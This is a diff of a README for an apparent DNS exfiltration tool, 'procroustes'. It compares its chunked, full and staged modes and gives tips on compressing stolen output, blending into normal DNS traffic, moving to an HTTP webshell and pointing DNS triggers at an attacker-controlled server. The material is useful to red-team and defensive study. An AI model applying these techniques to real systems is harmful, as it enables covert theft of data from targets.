@@ -56,8 +56,8 @@ stdbuf -oL tcpdump --immediate -l -i any udp port 53|./procroustes_chunked.sh -w
 
 In a nutshell, assuming we want to exfiltrate some data that has to be broken into four chunks in order to be able to be transmitted over DNS:
 * procroustes_chunked: calls the dispatcher four times, each time requesting a different chunk from the server. It has relatively small payload size, it's fast and doesn't need any special configuration.
-* procroustes_full: calls the dispatcher once, the command that will get executed on the server will be responsible for chunking the data and sending them over. It can have bigger payload size, it's fast (speed can be tuned through the -t parameter) and can be even faster when the staged_files/dnsns.py is running on the name server.
-* procroustes_full/staged: same as procroustes_full, but uses a stager to get the command used by procroustes_full to chunk the data. It has the smallest "payload" size but is also slow since the actual payload is downloaded over DNS. Finally it requires the configuration of the nsconfig script (examples in the staged_files) but it is noted that this script normally has to be configured only once per name server (and not per target server).
+* procroustes_full: calls the dispatcher once, the command that will get executed on the server will be responsible for chunking the data and sending them over. It can have bigger payload size, it's fast (speed can be tuned through the -t parameter) and its speed is further improved when the dns_server is running on the name server.
+* procroustes_full/staged: same as procroustes_full, but uses a stager to get the command used by procroustes_full to chunk the data. It has the smallest "payload" size but is also slowest with regards to exfiltration rate since the actual payload is downloaded over DNS. Finally it requires the configuration of the nsconfig script. Note: the nsconfig script normally has to be configured only once per name server (and not per target server).
 
 Some of their differences can also be illustrated through the template commands used for bash:
 
@@ -81,7 +81,7 @@ procroustes_full/bash/staged:
 | -------------         |:-------------:               |:-----:         |:-----:         |
 | payload size overhead (bash/powershell)  | 150\*NLABELS/500\*NLABELS (+CMD_LEN)          | 300/800 (+CMD_LEN)       |   150/400[1]  |
 | dispatcher calls #     | #output/(LABEL_SIZE*NLABELS)[2] |   1          |                1    |
-| speed (bash/powershell)                | ✔/✔                         |  ✔/✔         | ✓/✓ <br>(overhead of stage download time)[3]|
+| speed (bash/powershell)                | ✔/✔                         |  ✔/✔         | ✓/✓[3]|
 | configuration difficulty                | easy                         |  easy+         | medium|
 
 [1] For the staged version, the command is downloaded through DNS, so the listed size is the total payload size as well. 
@@ -89,16 +89,16 @@ procroustes_full/bash/staged:
 [2] On procroustes_chunked, the provided command gets executed multiple times on the server until all of its output is extracted. This behavior may cause problems in case that command is not idempotent (functionality or output-wise) or is time/resource intensive. 
 A workaround to avoid running into issues for the aforementioned cases is to first store the command output into a file (e.g. /tmp/file) and then read that file.
 
-[3] The staged version makes use of A records to download the payload. Even though this allows our traffic to blend in better with the regular traffic of the target environment, it offers limited channel capacity (e.g. 4 bytes per request). We could make use of other record types like TXT and minimize the stage download time (close to zero) and the stager size.
+[3] In the staged version we have the overhead of the time required to get the actual payload over DNS. It should be noted that the script makes use of A records to get the actual payload. Even though this allows our traffic to blend in better with the regular traffic of the target environment, it offers limited channel capacity (e.g. 4 bytes per request). We could make use of other record types like TXT and minimize the stage download time (close to zero) and the stager size.
 
 ### Tips
 
  - You probably want to use this script as little as possible, try to transition to a higher bandwidth channel the soonest possible (e.g. HTTP-webshell)
  - In case long text output is expected, you can try compressing it first to speed up the exfil process, e.g. ./procrustes_full.sh ... -o >(setsid gunzip) -- 'ls -lhR / | gzip'
  - Another possibility for big/binary files is to copy them to a path which is accessible for example through HTTP
- - For increased exfil bandwidth, run the staged_files/dnsns.py on your name server. That way, we avoid waiting for the underlying DNS_TRIGGER to timeout before moving on to a new chunk.
+ - For increased exfil bandwidth in procrustes_full, run the dns_server on your name server. That way, we avoid waiting for the underlying DNS_TRIGGER to timeout before moving on to a new chunk.
  - Ideally, you would have a domain (-h option) with an NS record pointing to a server you control (server where we run tcpdump). Nevertheless, in case the target is allowed to initiate connections to arbitrary DNS servers, this can be avoided by having the DNS trigger explicitly set to use our DNS server (e.g. dig @your_server whatev.er)
 
 ### Credits
 * [Collabfiltrator](https://github.com/0xC01DF00D/Collabfiltrator) - idea of chunking the data on the server. It also performs similar functionalities with this script, so check it out.
-* [DNSlivery](https://github.com/no0be/DNSlivery) - modified version of DNSlivery is used as DNS server in the staged version
+* [DNSlivery](https://github.com/no0be/DNSlivery) - modified version of DNSlivery is used as the DNS server
